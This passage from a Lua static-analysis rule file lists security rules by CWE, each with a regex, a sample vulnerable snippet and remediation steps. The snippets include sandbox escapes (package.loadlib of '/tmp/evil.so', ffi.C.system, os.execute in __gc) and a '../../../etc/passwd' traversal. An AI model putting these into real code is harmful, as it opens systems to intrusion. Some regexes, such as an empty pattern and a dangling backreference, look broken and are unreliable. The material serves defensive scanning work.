  completely bypassing the Lua sandbox.\n\nVulnerable pattern:\n  local func = package.loadlib(\"\
  /tmp/evil.so\", \"luaopen_evil\")\n  func()\n\nRemediation:\n- Remove package.loadlib\
  \ from sandboxes\n- Restrict to trusted, hardcoded paths only\n- Never allow user-controlled\
  \ library paths\n- Disable C extension loading in untrusted environments\n- Use\
  \ load restrictions in Lua initialization\n"
---
id: lua-sandbox-escape-coroutine-environment
language: lua
severity: warning
message: Coroutines may have access to different environments enabling sandbox escape
tags:
- security
- sandbox-escape
- coroutines
rule:
  kind: pattern
  pattern: 'coroutine\.(create|resume|wrap)

    '
note: "Coroutines may have access to different environments than the current context,\n\
  potentially allowing escape from sandbox restrictions.\n\nVulnerable pattern:\n\
  \  local co = coroutine.create(function()\n      local env = getfenv(0)\n      return\
  \ env.os\n  end)\n  coroutine.resume(co)\n\nRemediation:\n- Ensure consistent environment\
  \ across coroutines\n- Apply sandbox restrictions to all coroutines\n- Test coroutine\
  \ behavior in sandboxes\n- Consider disabling coroutines in strict sandboxes\n"
---
id: lua-cwe-22-io-open-path-traversal
language: lua
severity: warning
message: 'CWE-22: io.open() with user path can access files outside intended directory'
tags:
- security
- path-traversal
- CWE-22
- OWASP-PathTraversal
rule:
  kind: function_call
  pattern: 'io\.open\(.*(\.\.|/|\\\)[^)]*\)

    '
note: "Path traversal using \"..\" or absolute paths can access files outside the\n\
  intended directory.\n\nVulnerable pattern:\n  local f = io.open(\"data/\" .. user_filename,\
  \ \"r\")\n\nRemediation:\n- Canonicalize paths before opening\n- Validate against\
  \ whitelist of allowed directories\n- Reject \"..\" components\n- Reject absolute\
  \ paths\n- Use basename only or restricted path patterns\n- Implement strict file\
  \ access control\n"
---
id: lua-cwe-73-io-open-write-arbitrary-files
language: lua
severity: warning
message: 'CWE-73: io.open() write mode with user path enables arbitrary file write'
tags:
- security
- file-manipulation
- CWE-73
rule:
  kind: function_call
  pattern: io\.open\([^)]*[wWaA][^)]*\)
note: "Arbitrary file write can overwrite configuration files, inject code, or cause\n\
  data loss.\n\nVulnerable pattern:\n  io.open(user_path, \"w\"):write(content)\n\n\
  Remediation:\n- Strict path validation (canonicalize, whitelist, reject traversal)\n\
  - Only write to controlled directories\n- Validate file paths before write operations\n\
  - Use temporary files with restricted locations\n- Set appropriate file permissions\
  \ after creation\n"
---
id: lua-cwe-400-io-read-memory-exhaustion
language: lua
severity: warning
message: 'CWE-400: io.read(''*a'') without size limit causes OOM with large files'
tags:
- security
- denial-of-service
- CWE-400
- resource-exhaustion
rule:
  kind: function_call
  pattern: '(io\.read|file:read)\(\s*["\'']?\*a["\'']?\s*\)

    '
note: "Reading entire files into memory with '*a' can exhaust memory if used on\n\
  large or adversarially-sized files.\n\nVulnerable pattern:\n  local content = io.open(file):read(\"\
  *a\")  -- Could read multi-GB file\n\nRemediation:\n- Check file size before reading\n\
  - Read files in chunks rather than all at once\n- Set memory limits/quotas\n- Use\
  \ streaming APIs where possible\n- Validate file size and reject oversized files\n"
---
id: lua-cwe-377-io-tmpfile-insecure
language: lua
severity: warning
message: 'CWE-377: io.tmpfile() may be predictable or accessible by other processes'
tags:
- security
- temporary-file
- CWE-377
rule:
  kind: function_call
  pattern: 'io\.tmpfile\(\)

    '
note: "Temporary files may be predictable or readable/writable by other processes,\n\
  compromising data confidentiality.\n\nVulnerable pattern:\n  local tmp = io.tmpfile()\n\
  \  tmp:write(secret_data)\n\nRemediation:\n- Use secure temporary file creation\
  \ with random names\n- Set proper file permissions (600 / read-write for owner only)\n\
  - Use platform-specific secure temp APIs if available\n- Clean up temporary files\
  \ explicitly\n- Consider encrypting temporary file contents\n"
---
id: lua-cwe-22-os-rename-remove-path-traversal
language: lua
severity: warning
message: 'CWE-22: os.rename/remove with user path can manipulate arbitrary files'
tags:
- security
- path-traversal
- file-manipulation
- CWE-22
- OWASP-PathTraversal
rule:
  kind: function_call
  pattern: 'os\.(rename|remove)\([^)]*

    '
note: "File manipulation operations with user-controlled paths can delete or move\n\
  critical files outside the intended directory.\n\nVulnerable pattern:\n  os.remove(\"\
  uploads/\" .. user_input)  -- Could be \"../../config.lua\"\n\nRemediation:\n- Validate\
  \ paths strictly\n- Use canonical paths\n- Reject \"..\" components\n- Whitelist\
  \ allowed files/directories\n- Never accept absolute paths from user input\n"
---
id: lua-cwe-89-sql-string-concatenation
language: lua
severity: error
message: 'CWE-89: SQL queries with user input concatenation enable SQL injection'
tags:
- security
- sql-injection
- CWE-89
- database
rule:
  kind: pattern
  pattern: '".*\.\..*"

    '
note: "Concatenating user input directly into SQL queries enables SQL injection attacks.\n\
  \nVulnerable pattern:\n  local sql = \"SELECT * FROM users WHERE name = '\" .. username\
  \ .. \"'\"\n  cursor = conn:execute(sql)\n\nRemediation:\n- Use parameterized queries/prepared\
  \ statements\n- Never concatenate user input into SQL strings\n- Use SQL escaping\
  \ functions if parameterized queries unavailable\n- Validate and sanitize all user\
  \ input\n- Use ORMs that handle parameterization\n"
---
id: lua-cwe-89-sql-string-format-injection
language: lua
severity: error
message: 'CWE-89: string.format in SQL without escaping enables SQL injection'
tags:
- security
- sql-injection
- CWE-89
- database
rule:
  kind: function_call
  pattern: 'string\.format\(.*%s.*\)

    '
note: "string.format with %s specifier doesn't escape SQL special characters,\nenabling\
  \ SQL injection.\n\nVulnerable pattern:\n  local sql = string.format(\"SELECT *\
  \ FROM users WHERE id = %s\", user_id)\n\nRemediation:\n- Use parameterized queries\
  \ instead\n- Proper SQL escaping for the specific database\n- Type validation for\
  \ numeric fields\n- Never rely on string formatting for SQL safety\n"
---
id: lua-cwe-89-luasql-execute-dynamic
language: lua
severity: warning
message: 'CWE-89: Direct SQL execution without prepared statements enables injection'
tags:
- security
- sql-injection
- CWE-89
- database
rule:
  kind: function_call
  pattern: 'conn:execute\([^)]*\.\.[^)]*\)

    '
note: "Dynamic SQL execution with string concatenation enables SQL injection.\n\n\
  Vulnerable pattern:\n  conn:execute(\"INSERT INTO logs VALUES ('\" .. msg .. \"\
  ')\")\n\nRemediation:\n- Use prepared statements with conn:prepare() followed by\
  \ :execute()\n- Use parameterized queries\n- Validate and escape all user input\n\
  - Consider using ORMs or query builders\n"
---
id: lua-cwe-89-sql-like-pattern-injection
language: lua
severity: warning
message: 'CWE-89: SQL LIKE patterns with unescaped user input enable pattern injection'
tags:
- security
- sql-injection
- CWE-89
- database
rule:
  kind: pattern
  pattern: LIKE.*%[^)]*
note: "LIKE wildcards (% and _) in unescaped user input can match unintended data.\n\
  \nVulnerable pattern:\n  local sql = \"SELECT * FROM users WHERE name LIKE '%\"\
  \ .. search .. \"%'\"\n\nRemediation:\n- Escape % and _ in LIKE patterns\n- Escape\
  \ backslash character as well\n- Use prepared statements where possible\n- Validate\
  \ input character set\n"
---
id: lua-cwe-190-tonumber-range-overflow
language: lua
severity: warning
message: 'CWE-190: tonumber() without range checking can cause integer overflow'
tags:
- security
- integer-overflow
- CWE-190
rule:
  kind: function_call
  pattern: 'tonumber\(

    '
note: "Large numbers from tonumber() can cause overflow or unexpected behavior in\
  \ loops\nand array operations.\n\nVulnerable pattern:\n  local count = tonumber(user_input)\n\
  \  for i = 1, count do ... end  -- Could be 10^308\n\nRemediation:\n- Validate numeric\
  \ ranges after conversion\n- Set minimum and maximum bounds\n- Check for inf and\
  \ nan values\n- Test with extreme values\n- Use reasonable limits based on use case\n"
---
id: lua-cwe-843-type-confusion-missing-validation
language: lua
severity: warning
message: 'CWE-843: Using user input without type() validation causes type confusion'
tags:
- security
- type-confusion
- CWE-843
rule:
  kind: pattern
  pattern: 'function\s+\w+\([^)]*\).*:upper|:lower|:sub|:gsub

    '
note: "Type confusion occurs when functions are called on wrong data types.\n\nVulnerable\
  \ pattern:\n  function process(data)\n      return data:upper()  -- Fails if data\
  \ is number or table\n  end\n\nRemediation:\n- Validate types: if type(data) ~=\
  \ \"string\" then error(...) end\n- Use type() checks at function entry\n- Consider\
  \ metatables for type safety\n- Document expected types in comments\n"
---
id: lua-cwe-20-empty-string-validation
language: lua
severity: info
message: 'CWE-20: Empty strings not checked can bypass validation or cause issues'
tags:
- security
- input-validation
- CWE-20
rule:
  kind: pattern
  pattern: '""'
note: "Empty strings may bypass validation or cause unexpected behavior like opening\n\
  the current directory instead of a file.\n\nVulnerable pattern:\n  local filename\
  \ = user_input\n  local f = io.open(filename)  -- Opens cwd if empty\n\nRemediation:\n\
  - Explicitly check for empty strings: if #str == 0 or str == \"\" then\n- Reject\
  \ empty input for required fields\n- Validate string length\n"
---
id: lua-cwe-1333-regex-redos-performance
language: lua
severity: warning
message: 'CWE-1333: Complex Lua patterns on user input can cause performance issues'
tags:
- security
- denial-of-service
- CWE-1333
rule:
  kind: function_call
  pattern: 'string\.(match|find|gmatch)\([^)]*\([^)]*-[^)]*\)[^)]*\)

    '
note: "Complex Lua patterns can cause performance degradation with long strings,\n\
  though less critical than regex ReDoS.\n\nVulnerable pattern:\n  string.match(user_input,\
  \ \"(.-)(.-)(.-)(.-)$\")\n\nRemediation:\n- Limit user input length\n- Use simpler\
  \ patterns\n- Add timeouts for pattern matching\n- Test patterns with long malicious\
  \ strings\n- Consider alternative string processing approaches\n"
---
id: lua-cwe-476-nil-input-not-handled
language: lua
severity: info
message: 'CWE-476: Function accepting optional parameter without nil check causes
  issues'
tags:
- security
- null-pointer-equivalent
- CWE-476
rule:
  kind: function_call
  pattern: ''
note: "Nil inputs can propagate and cause errors in unexpected places.\n\nVulnerable\
  \ pattern:\n  function greet(name)\n      return \"Hello, \" .. name  -- Error if\
  \ name is nil\n  end\n\nRemediation:\n- Use nil coalescing: name or \"default\"\n\
  - Explicit nil checks: if name == nil then\n- Use type validation\n"
---
id: lua-cwe-400-table-unpack-stack-overflow
language: lua
severity: warning
message: 'CWE-400: table.unpack() with large tables can exceed stack limits'
tags:
- security
- denial-of-service
- stack-overflow
- CWE-400
- resource-exhaustion
rule:
  kind: function_call
  pattern: '(table\.)?unpack\(

    '
note: "Unpacking very large tables can exceed stack limits causing crashes.\n\nVulnerable\
  \ pattern:\n  local args = table.unpack(user_table)  -- Could crash with stack overflow\n\
  \nRemediation:\n- Limit table size before unpacking\n- Check table length: if #table\
  \ > MAX_SIZE then error() end\n- Use iterative approaches for large tables\n- Implement\
  \ manual unpacking with size limits\n"
---
id: lua-cwe-665-global-variable-pollution
language: lua
severity: warning
message: 'CWE-665: Unintended global variable creation from typos or missing ''local'''
tags:
- security
- initialization
- CWE-665
rule:
  kind: assignment
  pattern: '[a-zA-Z_][a-zA-Z0-9_]*\s*=

    '
note: "Forgetting 'local' keyword creates globals, potentially overwriting functions\n\
  or creating unexpected state.\n\nVulnerable pattern:\n  funcion = function() end\
  \  -- Typo, pollutes _G.funcion\n\nRemediation:\n- Use 'local' by default for all\
  \ variables\n- Enable strict mode/linting\n- Use Lua linters to catch undeclared\
  \ globals\n- Code review for variable declarations\n- Consider using --strict=global\
  \ directives\n"
---
id: lua-cwe-668-global-modification-dynamic
language: lua
severity: warning
message: 'CWE-668: _G direct modification with dynamic keys enables arbitrary globals'
tags:
- security
- global-pollution
- CWE-668
rule:
  kind: pattern
  pattern: '_G\[.*\]\s*=

    '
note: "Arbitrary global modification can overwrite critical functions.\n\nVulnerable\
  \ pattern:\n  _G[user_provided_name] = user_provided_value\n\nRemediation:\n- Never\
  \ use user input as global names\n- Use namespaced tables instead\n- Protect _G\
  \ with metatables\n- Prevent access to _G in sandboxes\n"
---
id: lua-cwe-668-builtin-overwrite
language: lua
severity: warning
message: 'CWE-668: Overwriting built-in functions affects all code'
tags:
- security
- builtin-override
- CWE-668
rule:
  kind: assignment
  pattern: '(print|require|pairs|ipairs|next|type|tonumber|tostring|error|assert|load|loadstring|dofile|loadfile)\s*=

    '
note: "Accidentally or maliciously overwriting built-ins affects all code using them.\n\
  \nVulnerable pattern:\n  print = function() end  -- Silences all print calls\n \
  \ require = my_require    -- Changes all module loading\n\nRemediation:\n- Freeze\
  \ built-ins in production\n- Use strict mode\n- Protect globals with metatables\
  \ preventing modification\n- Code review and linting\n"
---
id: lua-deprecated-module-function
language: lua
severity: warning
message: Deprecated module() function (Lua 5.1) has side effects on global environment
tags:
- security
- deprecated
- code-quality
rule:
  kind: function_call
  pattern: 'module\(

    '
note: "The module() function modifies global environment in unexpected ways.\n\nVulnerable\
  \ pattern:\n  module(\"mymodule\", package.seeall)\n\nRemediation:\n- Use return-based\
  \ module pattern: local M = {} ... return M\n- Modern Lua modules don't use module()\n\
  - Update to Lua 5.2+ patterns\n"
---
id: lua-cwe-284-index-metamethod-exposure
language: lua
severity: warning
message: 'CWE-284: __index metamethod can provide access to restricted functions'
tags:
- security
- access-control-bypass
- CWE-284
rule:
  kind: pattern
  pattern: __index
note: "__index can provide access to functions that should be restricted.\n\nVulnerable\
  \ pattern:\n  setmetatable(safe_table, {\n      __index = function(t, k)\n     \
  \     return _G[k]  -- Includes os, io, etc.\n      end\n  })\n\nRemediation:\n\
  - Whitelist allowed keys in __index\n- Return only safe values\n- Never expose dangerous\
  \ libraries through __index\n- Use restrictive __index implementations\n"
---
id: lua-cwe-362-gc-finalization-race-condition
language: lua
severity: warning
message: 'CWE-362: Garbage collection timing is unpredictable; __gc can run at wrong
  time'
tags:
- security
- race-condition
- CWE-362
rule:
  kind: pattern
  pattern: __gc
note: "__gc metamethods run at unpredictable times, potentially after sandbox removal\n\
  or security checks.\n\nVulnerable pattern:\n  setmetatable(obj, {\n      __gc =\
  \ function() os.execute(\"whoami\") end\n  })\n\nRemediation:\n- Avoid security-sensitive\
  \ code in __gc\n- Use explicit cleanup methods\n- Don't rely on __gc for security\n\
  - Test garbage collection behavior\n"
---
id: lua-cwe-200-tostring-information-disclosure
language: lua
severity: info
message: 'CWE-200: __tostring can leak sensitive data through implicit string conversion'
tags:
- security
- information-disclosure
- CWE-200
rule:
  kind: pattern
  pattern: __tostring
note: "__tostring is called implicitly during string operations, potentially leaking\n\
  sensitive data.\n\nVulnerable pattern:\n  setmetatable(user, {\n      __tostring\
  \ = function(u) return u.password end  -- Leaked in logs\n  })\n\nRemediation:\n\
  - Return only safe, non-sensitive representations\n- Avoid exposing secrets through\
  \ __tostring\n- Test string conversion of objects\n"
---
id: lua-cwe-94-call-metamethod-execution
language: lua
severity: warning
message: 'CWE-94: __call metamethod executes when table is called as function'
tags:
- security
- code-execution
- CWE-94
rule:
  kind: pattern
  pattern: __call
note: "__call metamethod is invoked when a table is called as a function, potentially\n\
  enabling code execution.\n\nVulnerable pattern:\n  local result = user_table(args)\
  \  -- Invokes __call\n\nRemediation:\n- Validate tables before calling\n- Don't\
  \ trust metatables\n- Check table type before invoking\n- Control __call implementations\n"
---
id: lua-cwe-284-missing-metatable-protection
language: lua
severity: warning
message: 'CWE-284: Sensitive table without __metatable field can be modified'
tags:
- security
- access-control-bypass
- CWE-284
rule:
  kind: pattern
  pattern: 'setmetatable\([^)]*\{[^}]*\}[^)]*\)

    '
note: "Without __metatable, anyone can get/set the metatable using getmetatable/setmetatable.\n\
  \nVulnerable pattern:\n  local secure = setmetatable({}, {__index = allowed_functions})\n\
  \  -- Attacker: getmetatable(secure).__index = dangerous_functions\n\nRemediation:\n\
  - Set __metatable to non-table value to protect\n- Example: __metatable = \"protected\"\
  \n- Prevent metatable access in sandboxes\n"
---
id: lua-cwe-284-newindex-rawset-bypass
language: lua
severity: warning
message: 'CWE-284: rawset() bypasses __newindex access control'
tags:
- security
- access-control-bypass
- CWE-284
rule:
  kind: function_call
  pattern: 'rawset\(

    '
note: "rawset bypasses __newindex metamethods, breaking access control relying on\
  \ them.\n\nVulnerable pattern:\n  local protected = setmetatable({}, {\n      __newindex\
  \ = function() error(\"readonly\") end\n  })\n  -- Bypass: rawset(protected, \"\
  key\", \"value\")\n\nRemediation:\n- Control access to rawset in sandbox\n- Don't\
  \ rely on __newindex alone for security\n- Use closures or other mechanisms\n- Prevent\
  \ rawset access in untrusted environments\n"
---
id: lua-cwe-787-ffi-arbitrary-memory-access
language: lua
severity: error
message: 'CWE-787: LuaJIT FFI ffi.cast/ffi.new allows arbitrary memory access'
tags:
- security
- memory-corruption
- CWE-787
- luajit
rule:
  kind: function_call
  pattern: 'ffi\.(cast|new)\(

    '
note: "FFI provides direct memory access. User-controlled types enable arbitrary\n\
  memory reads and writes.\n\nVulnerable pattern:\n  local ptr = ffi.cast(\"uint8_t*\"\
  , user_address)\n  ptr[0] = 0  -- Write anywhere\n\nRemediation:\n- Never use FFI\
  \ with untrusted input\n- Sandbox FFI completely in untrusted environments\n- Disable\
  \ FFI in game engines\n- Use only for trusted native code\n"
---
id: lua-cwe-78-ffi-c-function-calls
language: lua
severity: error
message: 'CWE-78: FFI ffi.C function calls bypass all Lua security'
tags:
- security
- command-execution
- CWE-78
- luajit
rule:
  kind: function_call
  pattern: 'ffi\.C\.[a-zA-Z_]

    '
note: "FFI can call arbitrary C functions directly, completely bypassing Lua sandbox.\n\
  \nVulnerable pattern:\n  ffi.C.system(\"whoami\")\n\nRemediation:\n- Remove FFI\
  \ from sandboxed environments\n- Disable FFI in game engines\n- Never expose ffi\
  \ to untrusted code\n- Use safe wrapper libraries if native access needed\n"
---
id: lua-cwe-787-ffi-buffer-overflow
language: lua
severity: error
message: 'CWE-787: FFI arrays don''t have bounds checking by default'
tags:
- security
- buffer-overflow
- CWE-787
- luajit
rule:
  kind: pattern
  pattern: 'ffi\.new\(.*\[\d+\]

    '
note: "FFI arrays can overflow without bounds checking.\n\nVulnerable pattern:\n \
  \ local arr = ffi.new(\"int[10]\")\n  arr[100] = 0  -- Buffer overflow!\n\nRemediation:\n\
  - Always validate indices\n- Use safe wrapper functions\n- Implement bounds checking\n\
  - Consider array access guards\n"
---
id: lua-cwe-843-ffi-type-confusion
language: lua
severity: error
message: 'CWE-843: FFI ffi.cast between incompatible types causes memory corruption'
tags:
- security
- type-confusion
- memory-corruption
- CWE-843
- luajit
rule:
  kind: function_call
  pattern: 'ffi\.cast\(

    '
note: "Arbitrary type casting can lead to memory corruption and type confusion.\n\n\
  Vulnerable pattern:\n  local str = ffi.cast(\"char*\", number_value)\n\nRemediation:\n\
  - Validate types before casting\n- Minimize FFI usage\n- Use type-safe wrappers\n\
  - Never cast incompatible types\n"
---
id: lua-cwe-114-ffi-load-untrusted-libraries
language: lua
severity: error
message: 'CWE-114: ffi.load() with user-specified library path executes arbitrary
  code'
tags:
- security
- process-control
- CWE-114
- luajit
rule:
  kind: function_call
  pattern: 'ffi\.load\(

    '
note: "Loading user-specified shared libraries executes arbitrary code.\n\nVulnerable\
  \ pattern:\n  local lib = ffi.load(user_provided_path)\n\nRemediation:\n- Never\
  \ load user-specified libraries\n- Use hardcoded paths only\n- Validate library\
  \ paths strictly\n- Consider disabling FFI entirely\n"
---
id: lua-cwe-20-roblox-remote-event-unvalidated
language: lua
severity: warning
message: 'CWE-20: Roblox RemoteEvent FireServer data must be validated server-side'
tags:
- security
- input-validation
- game-engine
- roblox
- CWE-20
rule:
  kind: pattern
  pattern: RemoteEvent:FireServer
note: "Client-sent data to Roblox server must be validated; clients can send anything.\n\
  \nVulnerable pattern:\n  -- SERVER (VULNERABLE)\n  Event.OnServerEvent:Connect(function(player,\
  \ data)\n      target.Health = target.Health - data.damage  -- Trusts client!\n\
  \  end)\n\nRemediation:\n- Server must validate all client data independently\n\
  - Never trust numeric values from clients\n- Implement server-side authority\n-\
  \ Validate player permissions and state\n"
---
id: lua-cwe-639-roblox-datastore-key-injection
language: lua
severity: warning
message: 'CWE-639: Roblox DataStore with user-controlled keys can access other users''
  data'
tags:
- security
- insecure-direct-object-reference
- game-engine
- roblox
- CWE-639
rule:
  kind: pattern
  pattern: 'DataStore:.*\([^)]*player_provided

    '
note: "User-controlled DataStore keys could access other users' data.\n\nVulnerable\
  \ pattern:\n  local key = \"user_\" .. player_provided_id\n  DataStore:GetAsync(key)\n\
  \nRemediation:\n- Use player.UserId directly as key component\n- Never trust player\
  \ input for key construction\n- Validate user IDs server-side\n- Use consistent\
  \ key naming schemes\n"
---
id: lua-cwe-829-roblox-require-asset-id-injection
language: lua
severity: warning
message: 'CWE-829: Roblox require() with user-controlled asset ID loads malicious
  modules'
tags:
- security
- inclusion
- game-engine
- roblox
- CWE-829
rule:
  kind: function_call
  pattern: 'require\([^)]*player|[^)]*user|[^)]*message

    '
note: "Loading modules by user-provided asset IDs enables malicious module loading.\n\
  \nVulnerable pattern:\n  local module = require(player_message)  -- Player sends\
  \ malicious asset ID\n\nRemediation:\n- Only require known, hardcoded module IDs\n\
  - Never use player input as asset IDs\n- Maintain whitelist of allowed modules\n"
---
id: lua-cwe-22-love2d-filesystem-path-traversal
language: lua
severity: warning
message: 'CWE-22: Love2D filesystem path traversal can escape sandbox with ''..''
  in paths'
tags:
- security
- path-traversal
- game-engine
- love2d
- CWE-22
rule:
  kind: function_call
  pattern: 'love\.filesystem\.(read|write|createDirectory|remove)\([^)]*\.\..*\)

    '
note: "Path traversal with \"..\" may escape Love2D filesystem sandbox.\n\nVulnerable\
  \ pattern:\n  love.filesystem.read(\"../../../etc/passwd\")\n\nRemediation:\n- Validate\
  \ paths against traversal attempts\n- Reject \"..\" components\n- Rely on Love2D\
  \ sandboxing but verify\n- Canonicalize paths\n"
---
id: lua-cwe-502-game-save-deserialization
language: lua
severity: error
message: 'CWE-502: Using loadstring/load for save files enables save file exploits'
tags:
- security
- deserialization
- game-engine
- CWE-502
rule:
  kind: function_call
  pattern: '(loadstring|load)\(.*save.*\)

    '
note: "Using code execution for save files allows save file exploits with arbitrary\n\
  code execution.\n\nVulnerable pattern:\n  local save = loadstring(save_file_contents)\n\
  \  save()\n\nRemediation:\n- Use data formats: JSON, MessagePack, etc.\n- Never\
  \ execute save data as code\n- Validate save file format and structure\n- Sign/encrypt\
  \ save files if needed\n"
---
id: lua-cwe-170-c-lua-pushstring-null-byte
language: lua
severity: warning
message: 'CWE-170: C module lua_pushstring truncates at null bytes'
tags:
- security
- null-termination
- c-module
- CWE-170
rule:
  kind: pattern
  pattern: lua_pushstring
note: "lua_pushstring stops at first null byte, causing truncation with binary data.\n\
  \nVulnerable pattern (C):\n  lua_pushstring(L, user_input);  // Stops at first \\\
  0\n\nRemediation:\n- Use lua_pushlstring with explicit length\n- Handle binary data\
  \ properly\n- Test with embedded null bytes\n"
---
id: lua-cwe-170-c-lua-tostring-length
language: lua
severity: warning
message: 'CWE-170: C module lua_tostring lacks length information for embedded nulls'
tags:
- security
- null-termination
- c-module
- CWE-170
rule:
  kind: pattern
  pattern: lua_tostring
note: "lua_tostring doesn't return length, causing issues with embedded nulls.\n\n\
  Vulnerable pattern (C):\n  const char* str = lua_tostring(L, 1);\n  strlen(str);\
  \  // Wrong if string has embedded nulls\n\nRemediation:\n- Use lua_tolstring to\
  \ get actual length\n- Handle binary data correctly\n- Test with null-containing\
  \ data\n"
---
id: lua-cwe-843-c-lua-userdata-type-confusion
language: lua
severity: error
message: 'CWE-843: C module userdata without type verification causes type confusion'
tags:
- security
- type-confusion
- c-module
- CWE-843
rule:
  kind: pattern
  pattern: lua_touserdata
note: "C code must verify userdata types to prevent type confusion attacks.\n\nVulnerable\
  \ pattern (C):\n  MyStruct* ptr = lua_touserdata(L, 1);\n\nRemediation:\n- Use luaL_checkudata\
  \ with type name\n- Verify type before operations\n- Store type information in metatables\n"
---
id: lua-cwe-20-c-module-argument-validation
language: lua
severity: info
message: 'CWE-20: C function missing argument validation can crash'
tags:
- security
- input-validation
- c-module
- CWE-20
rule:
  kind: pattern
  pattern: lua_tostring
note: "Missing argument validation in C functions can cause crashes or undefined behavior.\n\
  \nVulnerable pattern (C):\n  const char* str = lua_tostring(L, 1);  // May be nil\n\
  \nRemediation:\n- Use luaL_checkstring, luaL_checkint, etc.\n- Validate argument\
  \ counts\n- Check argument types before use\n"
---
id: lua-cwe-121-c-stack-overflow
language: lua
severity: warning
message: 'CWE-121: C module pushing to stack without lua_checkstack causes overflow'
tags:
- security
- stack-overflow
- buffer-overflow
- c-module
- CWE-121
rule:
  kind: pattern
  pattern: lua_push.*
note: "Pushing beyond stack limits without checking causes crashes.\n\nVulnerable\
  \ pattern (C):\n  for(int i = 0; i < 10000; i++) {\n      lua_pushinteger(L, i);\
  \  // Stack overflow!\n  }\n\nRemediation:\n- Call lua_checkstack(L, n) before pushing\
  \ many values\n- Validate loop counts\n- Use stack reserve patterns\n"
---
id: lua-cwe-338-math-random-weak-prng
language: lua
severity: error
message: 'CWE-338: math.random() is not cryptographically secure for security purposes'
tags:
- security
- weak-prng
- cryptography
- CWE-338
rule:
  kind: function_call
  pattern: 'math\.random\(\)

    '
note: "math.random is not cryptographically secure and should never be used for\n\
  security-sensitive purposes.\n\nVulnerable pattern:\n  local token = tostring(math.random(1000000,\
  \ 9999999))\n\nRemediation:\n- Use crypto libraries (LuaCrypto, OpenSSL bindings)\n\
  - Use OS random sources (/dev/urandom, CryptGenRandom, etc.)\n- Never use math.random\
  \ for security tokens, encryption keys, etc.\n"
---
id: lua-cwe-330-math-randomseed-predictable
language: lua
severity: warning
message: 'CWE-330: math.randomseed(os.time()) is predictable'
tags:
- security
- insufficient-entropy
- cryptography
- CWE-330
rule:
  kind: function_call
  pattern: 'math\.randomseed\(os\.time\(\)\)

    '
note: "Seeding with time is predictable; attacker can reproduce random sequences.\n\
  \nVulnerable pattern:\n  math.randomseed(os.time())\n  local secret = math.random()\n\
  \nRemediation:\n- Use better entropy sources\n- Use cryptographic PRNG\n- Combine\
  \ multiple entropy sources\n- Use proper random generation libraries\n"
---
id: lua-cwe-798-hardcoded-cryptographic-keys
language: lua
severity: error
message: 'CWE-798: Hardcoded cryptographic keys are easily extracted from code'
tags:
- security
- hardcoded-secrets
- cryptography
- CWE-798
rule:
  kind: pattern
  pattern: 'key\s*=\s*["\''][^"\'']+["\'']

    '
note: "Hardcoded keys are easily extracted from code.\n\nVulnerable pattern:\n  local\
  \ key = \"MyS3cr3tK3y12345\"\n  local encrypted = encrypt(data, key)\n\nRemediation:\n\
  - Use key derivation functions\n- Store keys securely (KMS, HSM, vault)\n- Load\
  \ keys from environment variables\n- Never hardcode secrets\n- Use key rotation\
  \ strategies\n"
---
id: lua-cwe-328-weak-hash-md5-sha1
language: lua
severity: warning
message: 'CWE-328: MD5 and SHA1 are cryptographically broken'
tags:
- security
- weak-cryptography
- CWE-328
rule:
  kind: function_call
  pattern: '(md5|sha1)\.sum\(

    '
note: "MD5 and SHA1 are cryptographically broken and unsuitable for security purposes.\n\
  \nVulnerable pattern:\n  local hash = md5.sum(password)  -- Use for password storage\n\
  \nRemediation:\n- Use SHA-256, SHA-3, or modern algorithms\n- Use password-specific\
  \ hashes: bcrypt, Argon2, scrypt, PBKDF2\n- Use HMAC for integrity checking\n"
---
id: lua-cwe-208-timing-side-channel
language: lua
severity: warning
message: 'CWE-208: String == comparison for secrets can leak length via timing'
tags:
- security
- timing-attack
- side-channel
- CWE-208
rule:
  kind: pattern
  pattern: == .*token|== .*secret|== .*password
note: "String == comparison can leak length or content via timing variations.\n\n\
  Vulnerable pattern:\n  if user_token == stored_token then\n      grant_access()\n\
  \  end\n\nRemediation:\n- Use constant-time comparison functions\n- Compare all\
  \ characters before returning\n- Use timing-safe comparison libraries\n- Test for\
  \ timing variations\n"
---
id: lua-cwe-400-unbounded-loop-dos
language: lua
severity: warning
message: 'CWE-400: Unbounded loops with user input enable denial of service'
tags:
- security
- denial-of-service
- CWE-400
rule:
  kind: pattern
  pattern: 'for\s+\w+\s*=\s*1,\s*\$USER

    '
note: "User-specified iteration counts can cause DoS attacks.\n\nVulnerable pattern:\n\
  \  local count = tonumber(user_input)\n  for i = 1, count do ... end\n\nRemediation:\n\
  - Cap maximum iterations\n- Add timeout mechanisms\n- Validate iteration count\n\
  - Implement resource limits\n"
---
id: lua-cwe-674-recursive-function-no-limit
language: lua
severity: warning
message: 'CWE-674: Recursive function without depth limit causes stack overflow'
tags:
- security
- uncontrolled-recursion
- denial-of-service
- CWE-674
rule:
  kind: pattern
  pattern: 'function\s+\w+\([^)]*\).*\1\(

    '
note: "Deep recursion without limits causes stack overflow crashes.\n\nVulnerable\
  \ pattern:\n  function process(data)\n      for _, child in ipairs(data.children)\
  \ do\n          process(child)  -- No depth limit\n      end\n  end\n\nRemediation:\n\
  - Add depth parameter with maximum limit\n- Use iterative approaches\n- Implement\
  \ tail-call optimization\n- Add assertions for maximum depth\n"
---
id: lua-cwe-400-string-rep-memory-bomb
language: lua
severity: warning
message: 'CWE-400: string.rep() with large count causes memory exhaustion'
tags:
- security
- denial-of-service
- memory-bomb
- CWE-400
- resource-exhaustion
rule:
  kind: function_call
  pattern: 'string\.rep\([^)]*,\s*\$USER

    '
note: "string.rep can create enormous strings exhausting memory.\n\nVulnerable pattern:\n\
  \  local repeated = string.rep(\"x\", tonumber(user_input))  -- 10^9 = OOM\n\nRemediation:\n\
  - Validate repetition count\n- Set maximum limit\n- Check result size before creation\n\
  - Implement memory quotas\n"
---
id: lua-cwe-400-table-growth-memory-bomb
language: lua
severity: warning
message: 'CWE-400: Unlimited table growth from user data exhausts memory'
tags:
- security
- denial-of-service
- memory-bomb
- CWE-400
- resource-exhaustion
rule:
  kind: pattern
  pattern: 'table\.insert\(.*for.*user|for.*user.*table\.insert

    '
note: "Unlimited table growth exhausts memory with large user data.\n\nVulnerable\
  \ pattern:\n  local data = {}\n  for line in user_file:lines() do\n      table.insert(data,\
  \ line)  -- Attacker sends 10GB file\n  end\n\nRemediation:\n- Limit table size\n\
  - Process data in streams\n- Implement quota checking\n- Set maximum element count\n"
---
id: lua-cwe-835-infinite-generator
language: lua
severity: warning
message: 'CWE-835: Generator/iterator from untrusted source may never terminate'
tags:
- security
- infinite-loop
- denial-of-service
- CWE-835
